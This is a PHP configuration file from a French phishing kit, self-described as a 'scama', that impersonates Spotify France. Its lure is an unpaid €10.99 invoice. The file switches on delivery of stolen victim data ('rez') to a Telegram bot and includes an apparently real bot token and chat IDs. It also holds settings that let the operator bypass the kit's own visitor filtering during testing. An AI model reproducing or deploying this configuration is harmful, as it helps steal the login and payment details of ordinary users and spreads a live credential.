<?php

#______        _                                   
#|  ___|      | |                                  
#| |_ __ _ ___| |_   ___  ___ __ _ _ __ ___   __ _ 
#|  _/ _` / __| __| / __|/ __/ _` | '_ ` _ \ / _` |
#| || (_| \__ \ |_  \__ \ (_| (_| | | | | | | (_| |
#\_| \__,_|___/\__| |___/\___\__,_|_| |_| |_|\__,_|


# Date création : 04/11/2023          
# Author : Fast Scama                                      
# Scama: Spotify FR 2023 PC + MOBILE
# Motif : régularisation de votre facture impayé de 10.99€
# 



/*---  Rez sur son Mail  ---*/
$mail_sending = false;
$rezmail = "";


/*---  Configuration des OPTIONS  ---*/

     
$msg_login = true;      /* Affiche message régularisation apres le login */

  



/*---  Rez sur bot télégram  ---*/

$telegram_sending = true;                       /* ACTIVE OU NON DE REZ VIA TELEGRAM */
$bot_token = "7271659943:AAEKiFm3G2X-z-obEp9QX-OQ41HJ5e5Km_g"; /* TOKEN BOT */
$chat_login = "6504711855";                 /* CHAT ID : de tout les rez */
$chat_visits = "6504711855";                /* CHAT ID : Toutes connexions validé ou non irons dans se canal */

#---------------------------------REZ DANS TELEGRAM--------------------------------------------#

$ip_dev = "127.0.0.1"; /* NE PAS TOUCHER TU PEUX TESTER VIA LOCALHOST / XAMPP / SERVER LOCAL */
$ip_bypass = "127.0.0.1"; /* TU MET TON IP PERMET DE BYPASS LES VPN / ISP / POUR FAIRE TES TEST DIRECT SUR PLESK */
?>